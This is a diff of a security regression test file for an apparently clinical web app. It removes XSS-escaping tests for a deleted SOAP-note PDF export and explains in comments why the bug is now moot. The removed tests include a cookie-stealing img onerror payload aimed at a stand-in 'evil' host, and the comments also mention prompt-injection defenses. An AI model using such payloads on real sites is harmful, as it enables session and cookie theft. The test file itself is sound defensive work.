@@ -24,14 +24,18 @@
 //    via a new asArray() helper, same principle as the pre-existing
 //    Array.isArray(result.flags) guard.
 //
-// 2. FIXED THIS PASS — ClinicalModules.jsx's SOAP-note PDF export
+// 2. FIXED THIS PASS, LATER MOOT — ClinicalModules.jsx's SOAP-note PDF export
 //    (exportPDF) interpolated soap_clinician/soap_a_diagnosis/soap_icd10
 //    raw into an HTML string written via document.write() into a real,
 //    unsandboxed popup — the exact same bug class as the already-fixed
 //    PostureEngine.jsx report (postureReportXssEscaping.test.js), just a
 //    different file/field. A clinician-typed diagnosis or clinician-name
 //    field containing `<img src=x onerror=...>` would have executed.
-//    Escaped with the same escHtml() helper/pattern used there.
+//    Escaped with the same escHtml() helper/pattern used there. This whole
+//    function lived inside LiveSOAPPanel, which was later removed entirely
+//    (the floating "Live SOAP" panel feature) -- the vulnerable code path
+//    no longer exists, so the regression tests that pinned this fix were
+//    removed along with it rather than left asserting on dead code.
 //
 // 3. FOUND AND FIXED (mitigated) — api/chat.js built its system prompt by
 //    raw string-interpolating `patientContext`, and AIAssistant.jsx's
@@ -56,7 +60,6 @@ import { mapParseResultToUpdates } from "../aiIntakeParser.js";
 
 const parseSrc = readFileSync(resolve(process.cwd(), "api/parse.js"), "utf-8");
 const chatSrc = readFileSync(resolve(process.cwd(), "api/chat.js"), "utf-8");
-const clinicalModulesSrc = readFileSync(resolve(process.cwd(), "src/ClinicalModules.jsx"), "utf-8");
 
 describe("/api/parse — the patient narrative is isolated from the system prompt (real prompt-injection defense already in place)", () => {
   test("the raw patient narrative is sent as a separate user-role message, never string-concatenated into the system prompt", () => {
@@ -201,30 +204,9 @@ describe("mapParseResultToUpdates — adversarial payload handling (the function
   });
 });
 
-describe("ClinicalModules.jsx SOAP-note PDF export — clinician/diagnosis/ICD-10 escaping (found + fixed this pass)", () => {
-  test("defines an escHtml helper inside exportPDF covering the 5 dangerous characters", () => {
-    const exportPdfMatch = clinicalModulesSrc.match(/const exportPDF = \(\) => \{[\s\S]*?const escHtml = \(s\) => String\(s \?\? ""\)\.replace\(\/\[&<>"'\]\/g[\s\S]*?\}\)\);/);
-    expect(exportPdfMatch).not.toBeNull();
-  });
-
-  test("clinician, diagnosis, and ICD-10 are all wrapped in escHtml() at the point they're read from patient data", () => {
-    expect(clinicalModulesSrc).toMatch(/const dx\s*=\s*escHtml\(data\["soap_a_diagnosis"\]/);
-    expect(clinicalModulesSrc).toMatch(/const icd2\s*=\s*escHtml\(data\["soap_icd10"\]/);
-    expect(clinicalModulesSrc).toMatch(/const clinician\s*=\s*escHtml\(data\["soap_clinician"\]/);
-  });
-
-  test("the original raw, unescaped read pattern is gone", () => {
-    expect(clinicalModulesSrc).not.toMatch(/const dx\s*=\s*data\["soap_a_diagnosis"\]\s*\|\|\s*""/);
-    expect(clinicalModulesSrc).not.toMatch(/const clinician\s*=\s*data\["soap_clinician"\]\s*\|\|\s*""/);
-  });
-
-  test("escHtml logic mirror neutralises a script/onerror payload the same way postureReportXssEscaping.test.js verifies for PostureEngine.jsx", () => {
-    const escHtml = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({
-      "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
-    }[c]));
-    const payload = `<img src=x onerror="fetch('//evil/steal?c='+document.cookie)">`;
-    const escaped = escHtml(payload);
-    expect(escaped).not.toContain("<img");
-    expect(escaped).toContain("&lt;img");
-  });
-});
+// NOTE: the "ClinicalModules.jsx SOAP-note PDF export — clinician/diagnosis/
+// ICD-10 escaping" describe block that used to live here tested exportPDF()/
+// escHtml() inside LiveSOAPPanel. LiveSOAPPanel (the floating "Live SOAP"
+// panel) was removed entirely, taking that function with it, so those
+// regression tests were removed too rather than assert on source that no
+// longer exists. See the item 2 note above.
